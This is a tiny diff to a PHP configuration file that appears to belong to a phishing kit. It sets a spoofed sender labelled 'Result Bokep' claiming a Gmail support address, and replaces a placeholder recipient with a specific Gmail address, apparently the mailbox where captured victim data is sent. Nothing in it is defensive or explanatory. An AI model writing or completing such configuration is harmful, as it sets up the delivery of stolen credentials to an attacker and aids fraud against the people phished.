@@ -4,6 +4,6 @@
 
 $sender = 'From: Result Bokep <support@gmail.com>';
 
-$emailku = 'emailmu@gmail.com';
+$emailku = 'syerlahot@gmail.com';
 
 ?>
